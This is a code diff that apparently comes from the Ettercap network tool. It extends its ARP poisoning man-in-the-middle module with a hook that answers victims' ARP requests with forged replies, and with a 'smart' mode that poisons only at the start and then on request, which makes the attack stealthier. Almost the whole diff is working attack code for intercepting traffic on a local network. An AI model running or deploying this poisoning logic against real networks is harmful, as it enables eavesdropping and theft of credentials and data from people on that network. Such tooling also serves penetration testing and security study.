@@ -23,6 +23,7 @@
 #include <ec_mitm.h>
 #include <ec_send.h>
 #include <ec_threads.h>
+#include <ec_hook.h>
 #include <ec_ui.h>
 #include <ec_sleep.h>
 
@@ -48,6 +49,7 @@ void arp_poisoning_init(void);
 EC_THREAD_FUNC(arp_poisoner);
 static int arp_poisoning_start(char *args);
 static void arp_poisoning_stop(void);
+static void arp_poisoning_confirm(struct packet_object *po);
 static int create_silent_list(void);
 static int create_list(void);
 
@@ -128,6 +130,9 @@ static int arp_poisoning_start(char *args)
    if (ret != ESUCCESS)
       SEMIFATAL_ERROR("ARP poisoning process cannot start.\n");
 
+   /* create a hook to look for ARP requests while poisoning */
+   hook_add(HOOK_PACKET_ARP_RQ, &arp_poisoning_confirm);
+
    /* create the poisoning thread */
    ec_thread_new("arp_poisoner", "ARP poisoning module", &arp_poisoner, NULL);
 
@@ -155,6 +160,9 @@ static void arp_poisoning_stop(void)
       ec_thread_destroy(pid);
    else
       return;
+
+   /* stop confirming ARP requests with poisoned answers */
+   hook_del(HOOK_PACKET_ARP_RQ, &arp_poisoning_confirm);
         
    USER_MSG("ARP poisoner deactivated.\n");
  
@@ -281,6 +289,10 @@ EC_THREAD_FUNC(arp_poisoner)
          }
       }
       
+      /* if smart poisoning is enabled only poison inital and then only on request */
+      if (GBL_CONF->arp_poison_smart && i < 3)
+          return NULL;
+
       /* 
        * wait the correct delay:
        * for the first 5 time use the warm_up
@@ -296,6 +308,48 @@ EC_THREAD_FUNC(arp_poisoner)
    
    return NULL; 
 }
+
+
+/*
+ * if a target wants to reconfirm the poisoned ARP information
+ * it should be confirmed while poisoning
+ */
+static void arp_poisoning_confirm(struct packet_object *po)
+{
+   struct hosts_list *g1, *g2;
+   char tmp[MAX_ASCII_ADDR_LEN];
+
+   /* ignore ARP requests origined by ourself */
+   if (!memcmp(po->L2.src, GBL_IFACE->mac, MEDIA_ADDR_LEN)) 
+      return;
+
+   DEBUG_MSG("arp_poisoning_confirm(%s)", ip_addr_ntoa(&po->L3.dst, tmp));
+
+   /* walk through the lists if ARP request was for a victim */
+   LIST_FOREACH(g1, &arp_group_one, next) {
+      /* if the sender is in group one ... */
+      if (!ip_addr_cmp(&po->L3.src, &g1->ip)) {
+         /* look if the target is in group two ... */
+         LIST_FOREACH(g2, &arp_group_two, next) {
+            if (!ip_addr_cmp(&po->L3.dst, &g2->ip)) {
+               /* confirm the sender with the poisoned ARP reply */
+               send_arp(ARPOP_REPLY, &po->L3.dst, GBL_IFACE->mac, &po->L3.src, po->L2.src);
+            }
+         }
+      }
+      /* else if the target is in group one ... */
+      if (!ip_addr_cmp(&po->L3.dst, &g1->ip)) {
+         /* look if the sender is in group two ... */
+         LIST_FOREACH(g2, &arp_group_two, next) {
+            if (!ip_addr_cmp(&po->L3.src, &g2->ip)) {
+               /* confirm the sender with the poisoned ARP reply */
+               send_arp(ARPOP_REPLY, &po->L3.dst, GBL_IFACE->mac, &po->L3.src, po->L2.src);
+            }
+         }
+      }
+   }
+}
+
 
 /*
  * create the list of victims
